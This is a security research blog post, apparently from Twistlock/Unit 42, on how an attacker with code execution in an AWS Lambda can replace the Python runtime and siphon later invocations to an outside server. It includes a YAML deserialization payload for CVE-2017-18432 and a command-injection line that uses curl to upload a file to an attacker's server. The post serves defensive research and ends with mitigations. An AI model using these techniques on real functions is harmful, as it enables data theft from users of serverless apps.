@@ -1,0 +1,153 @@
+AWS Lambda was released in 2014 and introduced a new cloud execution model – serverless computing, which is now widely adopted.
+Since then, numerous companies began offering security solutions for AWS Lambda and serverless computing in general.
+These security platforms commonly provide:
+Vulnerability Scanning – Ensuring that your code doesn’t contain any known vulnerabilities (‘one-days’).
+Runtime Protection – Preventing exploitation of zero-day vulnerabilities in production.
+But what can an attacker even do if he found a Remote Code Execution (RCE) vulnerability in a Lambda function?
+In other words, if there’s a security flaw in the user’s handler or in one of the modules used by it, what can an attacker achieve upon exploiting such vulnerability?
+Let’s examine a common use case – a Lambda that processes and validates some data, and then enters it into a database.
+Some straightforward answers come to mind:
+The attacker can abuse our vulnerable Lambda as an execution resource, and leverage it for crypto-mining, for example.
+The attacker has access to the resources available to the Lambda.
+Our Lambda has write privileges to a certain DB, and so the attacker has them too.
+These are legitimate attack vectors, but in the example above it’s likely that the attacker will be most interested in the users’ private information.
+Luckily for the users, our Lambda is appropriately configured with only writing privileges to the sensitive DB.
+Well, what about the other invocations?
+They contain new information designated for the DB, can the attacker access them somehow?
+That is the question I sought to answer in a research I conducted.
+The short answer is yes, an attacker can persist on a vulnerable Lambda instance and gain access to other invocations.
+Let’s see how.
+Lambda instances are scaled according to demand.
+If 3 concurrent requests occur, AWS will scale the number of Lambda instances accordingly.
+Spinning up a new Lambda instance takes time, therefore, when a new Lambda instance handles its first request, its execution time is notably longer.
+This is called a cold start.
+To avoid frequent cold starts, AWS will keep Lambda instances alive for some time to handle subsequent requests.
+From my experience, an instance is normally removed after 10-15 inactive minutes.
+One major takeaway from this execution model is that Lambda invocations aren’t completely separated from each other.
+They could run, though not simultaneously, in the same execution environment.
+With that in mind, let’s start dissecting that environment.
+Lambda supports several runtimes, with the most popular being Python 3.7 and Node.js 10.
+I decided to focus on the Python runtime.
+I wanted to set up a reverse shell from a Lambda to my local machine and start investigating the environment.
+Soon enough though, I realized that won’t be trivial.
+A reverse shell will require an ongoing connection, but keeping a Lambda running for more than a few seconds can get costly.
+Moreover, Lambdas timeout after a relatively short period (the maximum is 15 minutes).
+A better-suited approach is to reinvoke the Lambda for each shell command.
+In this method, you deploy a Lambda which executes received commands and returns their output.
+I’ve seen some open-source tools that do exactly that, but I didn’t find them convenient enough.
+Most didn’t implement a shell interface, and none supported features which I thought to be necessary – working directory (CWD) tracking, transferring files between the Lambda and the local machine, and most importantly – pretty colors.
+I decided to create my own tool and thus SPLASH was born.
+SPLASH stands for Splash Pseudo Lambda Shell.
+To use splash, the only setup required is to deploy a Lambda running the splash agent LEX (Lambda Executor), and configure splash with your Lambda address.
+Using splash, I started poking around the environment.
+Here are the processes running on the Lambda.
+You can see that all of them run as the same unprivileged user.
+Our Lambda runs in an isolated environment, which appears to be some sort of container.
+This can be verified by examining the cgroup mappings of the processes running on the Lambda.
+Control groups are one of the key isolation technologies used in containers.
+The cgroup names are prefixed with ‘sandbox’, a prefix that didn’t match any container engine I’m familiar with (I checked docker, podman, LXD and rkt just to be sure).
+Some container engines do offer options for setting custom cgroups, yet this doesn’t seem to be the case.
+I assume they use a proprietary container engine, which could be internally using an open source container runtime like runC.
+I proceeded to download the executables running on the Lambda, and began reverse engineering them.
+These are the main files I looked at:
+/var/rapid/init – a Golang binary, PID 1 in the Lambda.
+/var/runtime/bootstrap.py – the Python3.7 Lambda runtime.
+I eventually came up with the following architecture for a Lambda Python3.7 instance:
+A process outside the container, referred to as the “slicer” in the init binary, sends invocation events to the init process via shared memory.
+The init process sets up an HTTP server on port 9001 (hard-coded), with several exposed endpoints: /2018-06-01/runtime/invocation/next – get the next invocation event /2018-06-01/runtime/invocation/{invoke-id}/response – return the handler response for the invoke /2018-06-01/runtime/invocation/{invoke-id}/error – return an execution error
+/2018-06-01/runtime/invocation/next – get the next invocation event
+/2018-06-01/runtime/invocation/{invoke-id}/response – return the handler response for the invoke
+/2018-06-01/runtime/invocation/{invoke-id}/error – return an execution error
+In bootstrap.py the following loop queries the init process for a new event, and then calls the user’s function to handle it (here, the request handler you uploaded runs).
+The handler response is then sent back to the init process through one of the following endpoints: /{invoke-id}/response – if the user handler executed successfully /{invoke-id}/error – if an exception was raised during the handling of the invoke The init process then hands over this response to the slicer.
+/{invoke-id}/response – if the user handler executed successfully
+/{invoke-id}/error – if an exception was raised during the handling of the invoke
+The init process then hands over this response to the slicer.
+One thing to note is how bootstrap.py invokes the user’s code.
+It doesn’t run it in a child process, but calls it as an external python module.
+This means that the user code, which might contain RCE vulnerabilities in it, runs as part of the bootstrap process.
+I briefly looked into other Lambda runtimes as well.
+Interpreter based runtimes (NodeJS, ruby) are almost identical to the Python runtime, except the bootstrap process is written in the runtime’s language (e.g.
+in the ruby runtime, it’s bootstrap.rb).
+Older versions of those runtime (e.g.
+NodeJS 8 and Python 2.7) are a bit different, and have only one process, called bootstrap, which also handles the responsibilities of the init process.
+Other runtimes (Golang, .net and Java) each have their own implementation.
+Back to our goal – as an attacker with RCE on a Lambda, we have code execution in a specific invocation, but we want access to the data posted on subsequent invocations – we need to gain some persistency.
+I figured that if we can replace either the init or bootstrap process with our own malicious version, we will have full access to all events sent to the Lambda instance.
+The bootstrap process seems like the easier choice – bootstrap.py is a Python script, which is much simpler to mimic and modify than a Golang binary like init.
+Now we just need a vulnerable Lambda to experiment with.
+Our Lambda deployment is packed with the yaml module, v3.13.
+Unfortunately, this version contains a code execution vulnerability in the yaml.load() function – CVE-2017-18432.
+Here is an example of a payload exploiting the vulnerability to calculate 1000 + 337 and print the result:
+!
+!python/object/new:exec [ "result = 1000 + 337; print('Output: ' + str(result))" ]
+If we send this to our Lambda and look at the logs, we can see that the code within our payload was executed (Lambdas’ output is transferred to CloudWatch Logs):
+I didn’t want to write one-liner payloads, so I wrote a small program, create_evil_yaml.py, that takes a Python script and transfers it into a valid payload.
+create_evil_yaml.py also takes in a data file, which is injected alongside the payload into the evil yaml file.
+Upon execution of the payload, the data is available to it as a variable called external_data_b64.
+With our vulnerable Lambda ready, we can carry out the plan to replace the bootstrap process.
+I created a yaml payload which contains the new runtime, writes it to a file on the Lambda and calls os.execv to replace bootstrap with it.
+Here is the code for switch_rutime.py:
+switch_runtime.py first decodes the new runtime from external_data_b64.
+It then checks if the Lambda’s /tmp dir is writable, and if it is, writes the new runtime there.
+If not, it uses the memfd_create syscall to create the runtime file in memory, instead of on the filesystem.
+The payload then calls os.execv to replace the bootstrap process with our new runtime.
+As you can see, switch_runtime.py passes one argument to the new runtime – invoke_id.
+Our new runtime will need it in order to reconnect to the init process.
+To understand why, let’s look at how the init and bootstrap process normally communicate with each other:
+Our new runtime will start running in the middle of this pattern:
+Therefore before requesting the next event, our new runtime will need to return a response for the event that spawned it.
+This requires our runtime to have that event’s invoke id, since the response endpoint URL is /${invoke-id}/response.
+switch_runtime.py runs in the context of the bootstrap process, and can thus extract the invoke id from bootstrap.py’s _GLOBAL_AWS_REQUEST_ID variable.
+This is done using the ‘inspect’ Python module, which allows you to inspect the stack of your process and access the data saved on it.
+Now that switch_runtime.py is ready, all that’s left is to write our new runtime!
+twist_runtime.py is a copy of the original bootstrap.py, with a couple of modifications:
+Upon starting, the runtime posts a mock response to the init process, using the invoke_id it received as an argument.
+Each event received by the runtime is sent to an external server before being handed to the user’s handler.
+The runtime also adds a small message to each Lambda response (which you’ll see in the video below).
+Putting everything together, here is a PoC video.
+In it, sendYamlData.py is used to send yaml files to the Lambda and print its response.
+Below is the attack flow:
+Once we compromised the Lambda instance, all requests directed to it are visible to our runtime.
+Of course, if the compromised instance doesn’t receive frequent requests, it will be taken down by AWS.
+Additionally, if concurrent requests are sent to the Lambda, some will be directed to other instances.
+A skilled attacker can still use some tricks to gain a better foothold and extract most requests to the Lambda, for example:
+He can periodically “warm” his Lambda instance by sending requests to the Lambda.
+He can also modify his runtime so that it will respond differently to this type of requests, to signal that it’s still alive.
+The attacker can also send concurrent payloads to take over several Lambda instances.
+Like in any attack, there is also the issue of staying undetected.
+Currently, the payload that replaces the runtime takes about 2 seconds to execute, which is relatively long in comparison to usual Lambda execution times.
+This can likely be shortened though, by dropping unnecessary initialization logic that was copied from bootstrap.py.
+On the other hand, the long execution time might be mistaken for a cold start, masking the attack.
+A smart attacker could also learn the function’s normal behavior and output, and try to use CloudWatch Logs to confuse defenders and obscure his attack.
+The yaml.load() vulnerability enables an attacker to execute code as part of the vulnerable process.
+On the other hand, there are many exploits that execute payloads as an external process.
+Consider the following vulnerable Lambda which returns the request’s body, encoded in Base64:
+An attacker can exploit this Lambda and send arbitrary commands, which will be executed in an external shell process.
+For example, he can send “; curl -f “@/some/path” {our-server-ip}:{port};” to upload a file from the Lambda to his server.
+Using this type of RCE vulnerabilities to take over the Lambda’s runtime is possible, but some modifications to the payload we used are required.
+Since our payload runs in an external process, it can’t use the inspect module to retrieve the invoke id.
+Instead, it should read bootstrap’s memory directly through /proc/${bootstrap-pid}/mem, and use regex to search for a sequence of bytes that match the invoke id format.
+Additionally, our payload will need to kill or stop the old bootstrap process.
+There are a few other smaller tweaks.
+If you’re interested, I used the vulnerable base64 Lambda above and wrote a small PoC, available here.
+I’d like to emphasize that the attack presented here isn’t a vulnerability in AWS.
+AWS Lambda follows a shared responsibility model – if your code has a vulnerability, that’s on you – as far as AWS is concerned.
+Future steps can be taken by AWS to separate the user code from the runtime, like running them in different processes, or with different privileges inside the Lambda instance, but I reckon most would hurt Lambda’s main upside – speed.
+One recommendation I do think can be implemented without much trouble is to set the ptrace scope at /proc/sys/kernel/yama/ptrace_scope to 2 (‘admin access’).
+This will disable ptrace operations inside the Lambda and deny access to /proc/{bootstrap-pid}/mem, preventing the external process attack.
+Developers might mistake serverless to be secure by default, mostly due to the temporary execution nature.
+This is not the case, and I hope that the PoC presented here highlights that.
+Invocations aren’t completely separated from each other, and for malicious parties, vulnerable Lambdas can be more than just an execution resource.
+With full control over a Lambda instance, attackers can access other invocations, alter the Lambda’s behavior and leak private information.
+Though I chose to focus on the Python 3.7 Lambda runtime, this type of takeover attack will most likely succeed in other runtimes as well.
+All runtimes share the same execution design, where user code runs in the same privilege as the runtime invoking it.
+Simply put, vulnerable user code compromises the runtime as well.
+All in all, serverless functions do still have the upside of being relatively small (code-wise), which makes them easier to secure given proper attention.
+Twistlock’s serverless Defender will prevent the PoC attack in three points:
+The vulnerable YAML package will be identified, and the user will be prompted to update to the fixed version.
+For Lambdas defined as read-only, the Defender will deny switch_runtime.py from writing the new runtime to the Lambda’s /tmp dir.
+The Defender will stop the os.execv call in switch_runtime.py.
+Of course, the Twistlock Console will also alert on this suspicious activity.
+This was a pretty long post, but I hope you now understand Lambda security risks better.
+As always, feel free to reach out with any questions you may have through email or @unit42_intel.
